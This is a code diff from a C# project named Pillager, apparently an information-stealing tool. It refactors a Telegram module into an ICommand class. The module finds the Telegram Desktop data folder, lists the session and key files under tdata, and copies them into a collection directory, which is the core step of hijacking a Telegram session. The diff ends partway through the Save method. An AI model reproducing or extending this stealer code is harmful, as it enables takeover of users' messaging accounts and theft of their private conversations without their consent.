@@ -1,17 +1,16 @@
-﻿using System;
+﻿using Pillager.Helper;
+using System;
 using System.Collections.Generic;
 using System.Diagnostics;
 using System.IO;
 
 namespace Pillager.Messengers
 {
-    internal class Telegram
+    internal class Telegram : ICommand
     {
-        public static string MessengerName = "Telegram";
+        public string MessengerPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Telegram Desktop");
 
-        public static string MessengerPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Telegram Desktop");
-
-        private static string[] sessionpaths =
+        private string[] sessionpaths =
             {
                 "tdata\\key_datas",
                 "tdata\\D877F783D5D3EF8Cs",
@@ -31,7 +30,7 @@ namespace Pillager.Messengers
                 "tdata\\0CA814316818D8F6\\maps",
             };
 
-        public static void Save(string path)
+        public override void Save(string path)
         {
             try
             {
@@ -49,7 +48,7 @@ namespace Pillager.Messengers
                     tgpaths.Add(MessengerPath);
                 for (int i = 0; i < tgpaths.Count; i++)
                 {
-                    string savepath = Path.Combine(path, MessengerName);
+                    string savepath = Path.Combine(path, "Telegram");
                     Directory.CreateDirectory(savepath);
 
                     Directory.CreateDirectory(Path.Combine(savepath, "tdata_" + i));
